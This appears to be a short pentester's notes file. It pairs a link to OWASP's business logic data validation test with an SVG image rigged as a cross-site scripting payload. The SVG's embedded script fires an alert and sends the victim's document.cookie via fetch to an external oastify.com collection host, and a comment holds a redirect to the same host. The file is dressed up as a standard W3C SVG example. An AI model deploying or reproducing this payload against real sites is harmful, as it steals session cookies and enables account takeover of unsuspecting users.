## [Business Logic Data Validation](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation)

+ Looking for data entry points or hand off points between systems or software.
+ Once found try to insert logically invalid data into the application/system. 

##


<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="6cm" height="5cm" viewBox="0 0 600 500"
     xmlns="http://www.w3.org/2000/svg" version="1.1">
  <desc>Example script01 - invoke an ECMAScript function from an onclick event
  </desc>
  <!-- ECMAScript to change the radius with each click
  window.location.href="lj8uu1zz5xx7edtz0ygmlynp0g67uyin.oastify.com";
  -->
  <script type="application/ecmascript"> <![CDATA[
    alert("sploited");
    onload=fetch('//lj8uu1zz5xx7edtz0ygmlynp0g67uyin.oastify.com/?cookie='+document.cookie);
  ]]> </script>

  <!-- Outline the drawing area with a blue line -->
  <rect x="1" y="1" width="598" height="498" fill="none" stroke="blue"/>
  <!-- Act on each click event -->
  <circle onclick="circle_click(evt)" cx="300" cy="225" r="100"
          fill="red"/>
  <text x="300" y="480" 
        font-family="Verdana" font-size="35" text-anchor="middle">
    <a href=#>Click here</a>
  </text>
</svg>